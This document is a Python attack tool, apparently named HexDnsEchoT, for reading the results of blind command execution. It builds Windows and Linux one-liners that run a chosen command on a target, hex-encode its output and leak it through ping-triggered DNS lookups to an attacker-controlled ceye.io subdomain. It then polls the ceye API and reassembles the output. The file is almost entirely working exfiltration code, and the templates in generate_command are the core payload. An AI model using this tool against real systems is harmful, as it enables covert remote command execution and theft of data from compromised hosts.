import argparse
import sys
import time
import random
import json
import binascii
import datetime
import pytz
import requests
from tzlocal import get_localzone

# author: 617sec //https://github.com/Dr-S1x17
# author: sv3nbeast //https://github.com/sv3nbeast/DnslogCmdEcho
# author: A0WaQ4 //https://github.com/A0WaQ4/HexDnsEchoT

requestTime = 3 # DNSLog platform interval per request
commandHex = {}

def get_new_config():
    global domain,dnsurl,token,command,filterdns,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce
    localTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) # get localtime
    lastFinishTime = timezone_change(localTime, src_timezone=str(get_localzone()), dst_timezone="UTC") # record last finish time
    print(lastFinishTime)
    print("获取本次命令执行的结果:\npython3 HexDnsEchoT.py -d " + domain + " -t " + token + " -f " + filterdns + " -lt \"" + lastFinishTime + "\"" + " -m GR")
    commandStartPos = 0
    commandEndPos = 0
    lastRecordLen = 0
    finishOnce = False

def get_config():
    global dnsurl,token,command,filterdns,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce
    print(lastFinishTime)
    commandStartPos = 0
    commandEndPos = 0
    lastRecordLen = 0
    finishOnce = False

def generate_command():
    commandTemWin = r'del command7 && del command7.txt && command > command7 &&echo 11111111111>>command7 && certutil -encodehex command7 command7.txt && for /f "tokens=1-17" %a in (command7.txt) do start /b ping -nc 1  %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.command.{0}'
    commandTemLinux = r'rm -f command7;rm -f command7.txt;command > command7 &&echo 11111111111 >>command7 && cat command7|hexdump -C > command7.txt && cat command7.txt |sed "s/[[:space:]]//g" | cut -d "|" -f1 | cut -c 5-55| while read line;do ping -c 1 -l 1 $line.command.{0}; done'
    commandWin = commandTemWin.format(dnsurl)
    commandLinux = commandTemLinux.format(dnsurl)
    print("Windows:\n")
    print(commandWin.replace('command',command))
    print("\nLinux:\n")
    print(commandLinux.replace('command',command))


def generate_code(code_len=4):
    all_charts = '0123456789abcdefghijklmnopqrstuvwxyz'
    last_pos = len(all_charts) -1
    code = ''
    for _ in range(code_len):
        index = random.randint(0,last_pos)
        code += all_charts[index]
    return code

def timezone_change(time_str, src_timezone, dst_timezone=None, time_format=None):
    """
    change timezone to utc timezone
    if dst_timezone is none, change time to localtime

    :param time_str:
    :param src_timezone: source timezone
    :param dst_timezone: target timezone; if equals none, change to localtime
    """
    if not time_format:
        time_format = "%Y-%m-%d %H:%M:%S"

    old_dt = datetime.datetime.strptime(time_str, time_format)

    dt = pytz.timezone(src_timezone).localize(old_dt)
    utc_dt = pytz.utc.normalize(dt.astimezone(pytz.utc))

    if dst_timezone:
        _timezone = pytz.timezone(dst_timezone)
        new_dt = _timezone.normalize(utc_dt.astimezone(_timezone))
    else:
        new_dt = utc_dt.astimezone()
    return new_dt.strftime(time_format)

# get DNSLog data 
def get_dnslogdata() -> list:
    if commandStartPos and commandEndFlag: 
        commandHex[commandName].extend([result[length-1]['name'] 
                                        for length in range(len(result),commandStartPos,-1) 
                                        if result[length-1]['name'].count('.') == 5])
                                        # Get the command part of the DNSLog data
        tempList = []
        for length in range(commandStartPos,-1,-1):
            if result[length-1]['created_at'] < lastFinishTime:break
            if result[length-1]['name'].count('.') == 5:
                tempList.append(result[length-1]['name']) 
        commandHex[commandName].extend(tempList)
        return commandHex[commandName]

# deal with DNSlog data, Format the output
def deal_data(data: list):
    global finishOnce
    if commandStartPos and commandEndFlag:
        for length in range(commandStartPos,-1,-1):
            if result[length-1]['created_at'] < lastFinishTime:break
            if result[length-1]['name'].count('.') == 5:
                commandHex[commandName].append(result[length-1]['name'])
        try:
            hexCommand = { item[:4] : item[4:] for item in commandHex[commandName] }

            hexCommand = sorted(hexCommand.items(), key=lambda x: int(x[0], 16))
            
            hexCommand = [ item[1][:32] for item in hexCommand]
            
        except:
            print('!!!!Error Command format! Try to find DNSLog site(dnslog) to get conntent..')
            pass
        hexCommand[-1] = ''.join(hexCommand[-1].split('0d0a')[:-1])
        commandResult = ''.join(hexCommand)
        # print(commandResult)
        try:
            commandResult = commandResult.split("0a3131")
            commandResult = commandResult[0] #兼容linux命令
        except:
            pass
        print('\n----Command Result----')
        Head = '\033[36m'
        End = '\033[0m'
        try:
            try:#gb2312解码
                print(Head + binascii.a2b_hex(commandResult).decode('gb2312') + End)
            except UnicodeDecodeError:#utf-8解码 linux存在中文字符需要这个解码
                print(Head + binascii.a2b_hex(commandResult).decode('utf-8') + End)
        except:
            print('Maybe use START to execute commands and cause DNSLog records to be lost..\nIt is recommended to remove START from the command')
        print('----Get Result End!----')
        finishOnce = True

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-d', "--dnsurl", help = "ceye dnslog")
    parser.add_argument('-t', "--token", help = "ceye token")
    parser.add_argument('-lt', "--lastfinishtime", help = "the lastfinisgtime")
    parser.add_argument('-f', "--filter", help = "dns filter")
    parser.add_argument('-m', "--model", help = "recent result", default = "result")
    args = parser.parse_args()
    if args.model == "GR":
        if args.dnsurl == None:
            print("without ceyedns!")
            sys.exit(0)
        if args.token == None:
            print("without ceyetoken!")
            sys.exit(0)
        if args.lastfinishtime == None:
            print("without lastfinishtime!")
            sys.exit(0)
        lastFinishTime = args.lastfinishtime
        get_config()
        domain = args.dnsurl
        filterdns = args.filter
        dnsurl =args.filter + "." + args.dnsurl
        print(dnsurl)
        token = args.token
        print(token)
    else:
        if args.dnsurl == None:
            print("without ceyedns!")
            sys.exit(0)
        if args.token == None:
            print("without ceyetoken!")
            sys.exit(0)
        filterdns = generate_code(8)
        domain = args.dnsurl
        dnsurl = filterdns + "." +args.dnsurl
        print(dnsurl)
        token = args.token
        print(token)
        command = input("请输入想要执行的命令:")
        get_new_config()
        generate_command()
        

    while True:
        if finishOnce:   
            get_new_config()
            filterdns = generate_code(8)
            dnsurl = filterdns + "." +args.dnsurl
            print(dnsurl)
            token = args.token
            print(token)
            command = input("请输入想要执行的命令:")
            generate_command()

        for i in range(requestTime,-1,-1):
            print('\r', 'Wait DNSLog data: {}s...'.format(str(i)), end='') 
            time.sleep(1)
        try:
            url = "http://api.ceye.io/v1/records?token=" + token + "&type=dns&filter=" + filterdns
            #proxies = { 'http':'http://127.0.0.1:8080' }
            result = json.loads(requests.get(url, proxies=False).text)
            result = result['data']
            if result == []:
                result = NULL
            result = sorted(result, key=lambda x: int(x['id']))
        except:
            print('\r', 'Not Find DNSLog Result!', end='')
            continue

        commandStartFlag = 1 if lastRecordLen == len(result) else 0
        lastRecordLen = len(result)
        commandEndFlag = 1 if commandEndPos == len(result) else 0 
        commandEndPos = len(result)
        
        if not commandStartPos and ((result[-1]['name'].count('.'))  == 5 or 
                                    commandStartFlag): 
                                    # judge if the DNSLog recording is start
            if result[-1]['created_at'] < lastFinishTime: 
                print('\r', 'Not Find DNSLog Result!', end='')
                continue                     
            commandStartPos = len(result)
            commandName = result[-1]['name'].split('.')[1]
            print('\nFind Command Record!...')
            print('----Command: \033[36m{}\033[0m----'.format(commandName))
            commandHex[commandName] = [] 
            print('Wait Command DNSLog Record Finish...')   
        if commandStartPos and ((result[-1]['name'].count('.')) != 5 or 
                                commandEndFlag):
                                # judge if the DNSLog recording is over
            commandEndFlag = 1
            #print('Command DNSLog Record Finish...')   

        dataList = get_dnslogdata()
        deal_data(dataList)
